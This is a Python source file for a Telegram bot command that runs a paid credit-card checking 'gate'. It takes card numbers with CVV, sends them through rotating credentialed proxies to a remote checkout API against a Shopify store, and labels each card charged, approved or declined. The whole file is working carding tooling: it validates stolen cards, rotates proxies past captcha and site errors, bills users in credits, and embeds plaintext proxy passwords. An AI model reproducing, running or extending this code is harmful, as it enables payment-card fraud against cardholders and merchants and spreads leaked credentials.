from live_emoji import plan_badge, dev_badge
import asyncio
import re
import logging
import aiohttp
import json
import time
import random
import os
import psycopg2.extras
from html import escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, get_db_connection
from bin import get_bin_info
from sub import get_premium_status

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GIF REACTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

async def get_anime_gif():
    """Fetches a random anime reaction GIF from otakugifs API."""
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_URL = "http://93.127.136.206:9090/shopify"
DEFAULT_SITE = "https://nicotests-com.myshopify.com"
MAX_RETRIES = 20

PROXY_LIST = [
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "http://OR1673915314:LMf4JcDV@208.196.99.128:8813",
    "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
    "http://1352:23CfS1Bz7oF0@p101.squidproxies.com:9094",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
]

# Responses that mean "try a different proxy" — not a real card result
RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'amount_too_small',
    'change proxy or site', 'token not found', 'invalid_response',
    'resolve', 'item', 'curl error', 'could not resolve host',
    'connect tunnel failed',
]

# Custom Emoji IDs
CUSTOM_CHARGED_EMOJI_ID = "4956719506027185156"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

# Mathematical Serif Bold Font Mapping
def math_bold(text: str) -> str:
    """Convert text to mathematical serif bold"""
    mapping = {
        'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄', 'F': '𝐅', 'G': '𝐆', 'H': '𝐇', 'I': '𝐈', 'J': '𝐉', 'K': '𝐊', 'L': '𝐋', 'M': '𝐌', 'N': '𝐍', 'O': '𝐎', 'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓', 'U': '𝐔', 'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘', 'Z': '𝐙',
        'a': '𝐚', 'b': '𝐛', 'c': '𝐜', 'd': '𝐝', 'e': '𝐞', 'f': '𝐟', 'g': '𝐠', 'h': '𝐡', 'i': '𝐢', 'j': '𝐣', 'k': '𝐤', 'l': '𝐥', 'm': '𝐦', 'n': '𝐧', 'o': '𝐨', 'p': '𝐩', 'q': '𝐪', 'r': '𝐫', 's': '𝐬', 't': '𝐭', 'u': '𝐮', 'v': '𝐯', 'w': '𝐰', 'x': '𝐱', 'y': '𝐲', 'z': '𝐳',
        '0': '𝟎', '1': '𝟏', '2': '𝟐', '3': '𝟑', '4': '𝟒', '5': '𝟓', '6': '𝟔', '7': '𝟕', '8': '𝟖', '9': '𝟗'
    }
    return ''.join(mapping.get(char, char) for char in text)

# Rate limit tracker (trial users only)
user_last_command_time: dict = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"[CL] Error checking stats columns: {e}")

ensure_stats_columns()

def update_user_stats_sync(user_id: int, is_charged: bool):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s",
        (user_id,)
    )
    if is_charged:
        cursor.execute(
            "UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s",
            (user_id,)
        )
    conn.commit()
    conn.close()

async def get_user_plan_name(user_id: int) -> str:
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute(
                    "SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1",
                    (user_id,)
                )
                row = cursor.fetchone()
                conn.close()
                return row["plan"].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_fetch)
        except Exception as e:
            logging.error(f"[CL] Error fetching plan name: {e}")
        return "PREMIUM"
    return "FREE"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def build_user_link(user_obj) -> str:
    """Builds a clickable user mention link."""
    name = escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/cl"))
async def cl_command(message: types.Message):
    # ─── Gate check ─────────────────────────────────────────────────
    if not await asyncio.to_thread(is_gate_enabled, "cl"):
        await message.reply(
            f"🚧 {math_bold('CLOVER GATE IS UNDER MAINTENANCE.')}",
            parse_mode="HTML"
        )
        return

    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    # ─── Rate limit (trial users only) ──────────────────────────────
    if not is_premium:
        last = user_last_command_time.get(user_id, 0)
        elapsed = current_time - last
        if elapsed < 10:
            remaining = round(10 - elapsed, 1)
            await message.reply(
                f"<tg-emoji emoji-id=\"6255910249362885846\">⚠️</tg-emoji> <b>𝗔𝗰𝘁𝗶𝘃𝗲 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 !</b>\n\n"
                f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗶𝗻𝗴.\n\n"
                f"<tg-emoji emoji-id=\"6136275172283391020\">⭐</tg-emoji> 𝗣𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗽𝗹𝗮𝗻 𝗳𝗼𝗿 𝘂𝘀𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻.",
                parse_mode="HTML"
            )
            return
        user_last_command_time[user_id] = current_time

    # ─── Credit check ────────────────────────────────────────────────
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits < 1:
        await message.reply(
            f"❌ {math_bold('INSUFFICIENT CREDITS')}\n\n"
            f"{math_bold('You need at least 1 credit to use this gate.')}\n"
            f"{math_bold('Use /buy to get more.')}",
            parse_mode="HTML"
        )
        return

    # ─── Extract card from text or replied message ───────────────────
    parts = message.text.split(maxsplit=1)
    raw_text = parts[1].strip() if len(parts) > 1 else ""

    if message.reply_to_message:
        replied = message.reply_to_message
        raw_text += " " + (replied.text or replied.caption or "")

    if not raw_text.strip():
        await message.reply(
            f"❌ {math_bold('Usage:')} /cl <code>cc|mm|yy|cvv</code>\n"
            f"{math_bold('Or reply to a message containing card details.')}",
            parse_mode="HTML"
        )
        return

    # ─── Parse card ──────────────────────────────────────────────────
    pattern = r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})'
    match = re.search(pattern, raw_text)
    if not match:
        await message.reply(
            f"❌ {math_bold('Invalid Card Format.')}\n"
            f"{math_bold('Please send as')} <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()
    mm = mm.zfill(2)
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    # ─── Luhn check ──────────────────────────────────────────────────
    if not luhn_check(cc):
        await message.reply(
            f"❌ {math_bold('Invalid Card Number')}\n"
            f"{math_bold('Luhn check failed.')}",
            parse_mode="HTML"
        )
        return

    plan_name = await get_user_plan_name(user_id)

    escaped_card = escape(formatted_cc)
    proc_msg = await message.reply(
        f"<pre><code>𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜⏳...</code></pre>\n"
        f"<pre><code>{escaped_card}</code></pre>\n"
        f"<b>𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➠ 𝘾𝙡𝙤𝙫𝙚𝙧 𝙋𝙖𝙮𝙢𝙚𝙣𝙩𝙨</b>\n",
        parse_mode="HTML"
    )

    asyncio.create_task(
        process_cl_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_cl_check(
    message: types.Message,
    proc_msg: types.Message,
    user: types.User,
    user_id: int,
    formatted_cc: str,
    cc: str,
    plan_name: str,
):
    check_started = time.time()
    api_result = {"Response": "UNKNOWN_ERROR"}
    last_proxy = None

    for _ in range(MAX_RETRIES):
        # Pick a proxy different from last if possible
        candidates = [p for p in PROXY_LIST if p != last_proxy] or PROXY_LIST
        current_proxy = random.choice(candidates)
        last_proxy = current_proxy

        try:
            timeout = aiohttp.ClientTimeout(total=45)
            params = {"site": DEFAULT_SITE, "cc": formatted_cc, "proxy": current_proxy}
            async with aiohttp.ClientSession() as session:
                async with session.get(API_URL, params=params, timeout=timeout) as resp:
                    text = await resp.text()
                    try:
                        api_result = json.loads(text)
                    except json.JSONDecodeError:
                        api_result = {"Response": f"PARSE_ERROR"}
        except Exception as e:
            logging.error(f"[CL] API error: {e}")
            api_result = {"Response": "CONNECTION_ERROR"}

        response_lower = api_result.get("Response", "").lower()
        should_rotate = any(err in response_lower for err in RETRY_ERRORS)
        if not should_rotate:
            break

    # ─── BIN lookup ──────────────────────────────────────────────────
    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_name} {country_flag}".strip() if country_flag else country_name

    # ─── Determine status ────────────────────────────────────────────
    response_raw = api_result.get("Response", "").upper()
    response_lower = response_raw.lower()
    is_charged_stat = False

    CHARGED_KEYWORDS = ["order_placed", "charged", "order_paid", "thank you", "thank_you"]
    APPROVED_KEYWORDS = [
        "3ds_required", "3d_authentication", "insufficient_funds",
        "invalid_cvc", "incorrect_cvc", "invalid_zip", "incorrect_zip",
    ]

    is_technical_error = (
        any(err in response_lower for err in RETRY_ERRORS)
        or "error" in response_lower
        or "timeout" in response_lower
    )

    if is_technical_error:
        final_status = f"{math_bold('ERROR')} ⚠️"
        credits_to_deduct = 0
    elif any(k in response_lower for k in CHARGED_KEYWORDS):
        final_status = f'{math_bold("CHARGED")} <tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">🔥</tg-emoji>'
        is_charged_stat = True
        credits_to_deduct = 1
    elif any(k in response_lower for k in APPROVED_KEYWORDS):
        final_status = f'{math_bold("APPROVED")} <tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
        is_charged_stat = True
        credits_to_deduct = 1
    else:
        final_status = f'{math_bold("DECLINED")} <tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'
        credits_to_deduct = 1

    # ─── Deduct 1 credit (skip if technical error) ───────────────────
    if credits_to_deduct > 0:
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = max(0, current_credits - 1)
        await asyncio.to_thread(update_credits, user_id, new_balance)

    # ─── Update stats ────────────────────────────────────────────────
    await asyncio.to_thread(update_user_stats_sync, user_id, is_charged_stat)

    # ─── Build result message ─────────────────────────────────────────
    user_link = build_user_link(user)
    dev_link = dev_badge()
    user_display = f"{user_link} {plan_badge(plan_name)}"

    elapsed = time.time() - check_started
    final_caption = (
        f"{math_bold('Status')} ➠ {final_status}\n"
        f"{math_bold('Card')} ➠ <code>{formatted_cc}</code>\n"
        f"{math_bold('Gateway')} ➠ {math_bold('Clover Payment')}\n"
        f"{math_bold('Response')} ➠ <b>{response_raw}</b>\n"
        f"{math_bold('Brand')} ➠ <b>{bin_scheme}</b>\n"
        f"{math_bold('Issuer')} ➠ <b>{bin_bank}</b>\n"
        f"{math_bold('Country')} ➠ <b>{bin_country}</b>\n"
        f"{math_bold('Time')} ➠ {elapsed:.2f}s\n"
        f"{math_bold('User')} ➠ {user_display}\n"
        f"{math_bold('Dev')} ➠ {dev_link}"
    )

    # G. FETCH ANIME GIF
    gif_url = await get_anime_gif()

    # H. Send as Animation (GIF) with Caption
    try:
        # Try to delete the processing message first
        try:
            await proc_msg.delete()
        except Exception:
            pass
        
        # Send as animation with GIF
        await message.reply_animation(
            animation=gif_url,
            caption=final_caption,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        # Fallback to editing the processing message if GIF sending fails
        logging.warning(f"[CL] Could not send GIF, falling back to text: {e}")
        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as edit_err:
            logging.error(f"Error editing message: {edit_err}")
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
    except Exception as e:
        # Ultimate fallback - just edit the processing message
        logging.error(f"Error sending result: {e}")
        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception:
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
